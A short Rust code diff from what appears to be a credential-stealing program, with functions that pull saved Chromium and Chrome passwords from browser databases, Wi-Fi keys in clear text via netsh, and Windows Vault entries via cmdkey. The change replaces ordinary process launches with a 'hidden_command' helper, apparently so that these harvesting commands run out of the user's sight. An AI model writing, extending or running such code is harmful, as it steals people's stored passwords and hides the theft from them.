@@ -127,7 +127,7 @@ fn extract_chromium_passwords(source: &str, user_data_path: &str) -> Vec<serde_j
     }
 
     // Read Login Data using sqlite3 CLI (avoid linking SQLite into the binary)
-    let output = std::process::Command::new("sqlite3")
+    let output = crate::utils::helpers::hidden_command("sqlite3")
         .args([
             &temp_db,
             "SELECT origin_url, username_value, hex(password_value) FROM logins WHERE password_value != '';",
@@ -276,7 +276,7 @@ fn extract_wifi_passwords() -> Vec<serde_json::Value> {
     let mut creds = Vec::new();
 
     // List profiles
-    let profiles_output = std::process::Command::new("netsh")
+    let profiles_output = crate::utils::helpers::hidden_command("netsh")
         .args(["wlan", "show", "profiles"])
         .output();
 
@@ -290,7 +290,7 @@ fn extract_wifi_passwords() -> Vec<serde_json::Value> {
                 }
 
                 // Get password for this profile
-                let key_output = std::process::Command::new("netsh")
+                let key_output = crate::utils::helpers::hidden_command("netsh")
                     .args(["wlan", "show", "profile", &format!("name={}", name), "key=clear"])
                     .output();
 
@@ -323,7 +323,7 @@ fn extract_windows_vault() -> Vec<serde_json::Value> {
     let mut creds = Vec::new();
 
     // Use cmdkey to list credentials
-    let output = std::process::Command::new("cmdkey")
+    let output = crate::utils::helpers::hidden_command("cmdkey")
         .args(["/list"])
         .output();
 
@@ -368,7 +368,7 @@ fn extract_chrome_linux() -> Vec<serde_json::Value> {
         return creds;
     }
 
-    let output = std::process::Command::new("sqlite3")
+    let output = crate::utils::helpers::hidden_command("sqlite3")
         .args([
             temp_db,
             "SELECT origin_url, username_value FROM logins WHERE username_value != '';",
